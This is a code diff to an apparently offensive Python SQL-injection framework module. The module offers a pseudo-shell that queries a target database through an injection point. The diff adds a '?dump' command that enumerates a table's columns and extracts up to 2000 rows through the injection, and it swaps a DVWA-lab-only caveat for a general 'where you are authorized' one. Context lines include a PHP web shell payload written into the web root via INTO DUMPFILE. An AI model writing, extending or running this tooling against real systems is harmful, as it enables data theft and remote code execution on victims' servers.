@@ -25,6 +25,9 @@ from prompt_toolkit.shortcuts import prompt, CompleteStyle
 
 from typing import List, Optional
 
+_DUMP_DEFAULT_ROWS = 200
+_DUMP_MAX_ROWS = 2000
+
 
 class Sqli(BaseModule):
     """Pseudo-shell and single-query helper for SQL injection modules."""
@@ -63,10 +66,6 @@ class Sqli(BaseModule):
         ),
         "?engines": (
             "SELECT GROUP_CONCAT(engine SEPARATOR ',') FROM information_schema.engines WHERE support IN ('YES','DEFAULT')"
-        ),
-        "?dvwa_users": (
-            "SELECT GROUP_CONCAT(CONCAT(user_id,0x3a,user,0x3a,password) ORDER BY user_id SEPARATOR ' | ') "
-            "FROM users"
         ),
     }
 
@@ -125,30 +124,112 @@ class Sqli(BaseModule):
             print_error(f"SQLi error: {exc}")
 
     def _shell_static_commands(self) -> List[str]:
-        base = ["help", "exit", "?persistence", "?outfile_template", "?mysql_users"]
+        base = ["help", "exit", "?persistence", "?outfile_template", "?mysql_users", "?dump"]
         base.extend(sorted(self._SHORTCUTS.keys()))
         base.extend(["?columns", "?count", "?privs_summary", "?secure_file", "?variables"])
         return sorted(set(base))
 
     def _show_sqli_help(self) -> None:
         print_info()
-        print_info("\thelp menu — SQLi pseudo-shell")
-        print_info("\t------------------------------")
-        print_info("\thelp / exit")
-        print_info("\t?version | ?db | ?user | ?hostname | ?datadir")
-        print_info("\t?charset | ?collation | ?basedir | ?version_comment | ?sql_mode")
-        print_info("\t?schemas | ?tables | ?processlist | ?engines")
-        print_info("\t?columns <table>      Column names (current database)")
-        print_info("\t?count <table>        Row count")
-        print_info("\t?privs_summary        Privileges for CURRENT_USER (information_schema)")
-        print_info("\t?secure_file          @@secure_file_priv (INTO DUMPFILE / OUTFILE)")
-        print_info("\t?variables <prefix>   session_variables like prefix (optional prefix)")
-        print_info("\t?dvwa_users           Dump DVWA users table (lab)")
-        print_info("\t?mysql_users          List mysql.user accounts (often denied)")
-        print_info("\t?persistence          Notes on persistence / FILE (no SQL)")
-        print_info("\t?outfile_template     Example OUTFILE payload text (not executed)")
-        print_info("\t<any expr or SELECT>  Passed through wrap_scalar_expression")
+        print_info("\tSQLi pseudo-shell — help")
+        print_info("\t" + ("-" * 50))
+        print_info("\tShell")
+        print_info("\t  help | exit")
         print_info()
+        print_info("\tInstance / globals")
+        print_info("\t  ?version  ?db  ?user  ?hostname  ?datadir")
+        print_info("\t  ?charset  ?collation  ?basedir  ?version_comment  ?sql_mode")
+        print_info()
+        print_info("\tSchema (default database)")
+        print_info("\t  ?schemas              All schema names")
+        print_info("\t  ?tables               Table names in current DB")
+        print_info("\t  ?columns <table>      Column names (ordered)")
+        print_info("\t  ?count <table>        Row count")
+        print_info(
+            f"\t  ?dump <table> [n]     Dump rows (n=1..{_DUMP_MAX_ROWS}, default {_DUMP_DEFAULT_ROWS}); "
+            "cells |, lines newline"
+        )
+        print_info("\t  (Very wide dumps may hit group_concat_max_len on the server.)")
+        print_info()
+        print_info("\tServer / privileges")
+        print_info("\t  ?processlist  ?engines  ?privs_summary  ?secure_file  ?mysql_users")
+        print_info("\t  ?variables [prefix]   performance_schema.session_variables")
+        print_info()
+        print_info("\tMeta (read-only notes / templates)")
+        print_info("\t  ?persistence       Hints (FILE, users, etc.) — no SQL run")
+        print_info("\t  ?outfile_template  Example OUTFILE text — not executed")
+        print_info()
+        print_info("\tRaw SQL")
+        print_info("\t  Any expression or SELECT …  → wrap_scalar_expression then injection")
+        print_info()
+
+    @staticmethod
+    def _sql_list_columns_query(table: str) -> str:
+        return (
+            "SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
+            f"FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}'"
+        )
+
+    @staticmethod
+    def _sql_backtick(ident: str) -> str:
+        return "`" + ident.replace("`", "``") + "`"
+
+    def _fetch_table_columns(self, table: str) -> Optional[List[str]]:
+        """Resolve column names for ``table`` in the current database via one scalar query."""
+        col_sql = self._sql_list_columns_query(table)
+        col_csv = self.sqli_fetch_scalar(col_sql)
+        if not col_csv or not str(col_csv).strip():
+            return None
+        return [c.strip() for c in str(col_csv).split(",") if c.strip()]
+
+    def _sql_dump_table(self, table: str, columns: List[str], row_limit: int) -> str:
+        inner = ", ".join(self._sql_backtick(c) for c in columns)
+        lim = max(1, min(int(row_limit), _DUMP_MAX_ROWS))
+        return (
+            "SELECT GROUP_CONCAT(_row SEPARATOR 0x0a) FROM ("
+            f"SELECT CONCAT_WS(0x7c, {inner}) AS _row FROM {self._sql_backtick(table)} LIMIT {lim}"
+            ") _sqli_dump"
+        )
+
+    def _handle_dump_command(self, line: str) -> bool:
+        """
+        ``?dump <table> [limit]`` — list columns then fetch concatenated rows (two scalar queries).
+        """
+        raw = line.strip()
+        m = re.match(r"^\?dump\s+(\w+)(?:\s+(\d+))?\s*$", raw, re.I)
+        if not m:
+            return False
+
+        table = self._safe_ident(m.group(1))
+        if not table:
+            return True
+
+        lim = int(m.group(2)) if m.group(2) else _DUMP_DEFAULT_ROWS
+        lim = max(1, min(lim, _DUMP_MAX_ROWS))
+
+        try:
+            columns = self._fetch_table_columns(table)
+        except Exception as exc:
+            print_error(f"Could not resolve columns: {exc}")
+            return True
+
+        if not columns:
+            print_error("No columns (unknown table, empty DB, or no permission).")
+            return True
+
+        dump_sql = self._sql_dump_table(table, columns, lim)
+        try:
+            out = self.sqli_fetch_scalar(dump_sql)
+        except Exception as exc:
+            print_error(f"Dump query failed: {exc}")
+            return True
+
+        print_status(f"Dump `{table}` — {len(columns)} columns, up to {lim} row(s)")
+        if out:
+            print_info(out)
+        else:
+            print_warning("Empty result (0 rows or truncation).")
+        return True
 
     def _safe_ident(self, name: str) -> Optional[str]:
         n = (name or "").strip()
@@ -167,10 +248,7 @@ class Sqli(BaseModule):
             t = self._safe_ident(m.group(1))
             if not t:
                 return None
-            return (
-                "SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',') "
-                f"FROM information_schema.columns WHERE table_schema=database() AND table_name='{t}'"
-            )
+            return self._sql_list_columns_query(t)
 
         m = re.match(r"^\?count\s+(\w+)\s*$", raw, re.I)
         if m:
@@ -247,7 +325,7 @@ class Sqli(BaseModule):
                 "Illustrative fragment (adjust quoting for your injection context):\n"
                 "  ... UNION SELECT '', '<\\\\?php echo shell_exec($_GET[\"c\"]); ?>' "
                 "INTO DUMPFILE '/var/www/html/shell.php' -- \n\n"
-                "Verify with ?secure_file and your web root; prefer labs (DVWA) only."
+                "Verify with ?secure_file and your web root; use only where you are authorized."
             )
             print_info()
             return True
@@ -282,7 +360,7 @@ class Sqli(BaseModule):
 
         print_info()
         print_status("Welcome to SQLi pseudo shell")
-        print_status("Shortcuts: ?tables, ?columns users, ?count users, ?persistence — type help")
+        print_status("Try: ?tables | ?columns users | ?dump users 20 | ?persistence — type help")
         print_info()
 
         while True:
@@ -308,6 +386,9 @@ class Sqli(BaseModule):
                 continue
 
             if self._handle_meta_command(command):
+                continue
+
+            if self._handle_dump_command(command):
                 continue
 
             resolved = self._resolve_shell_line(command)
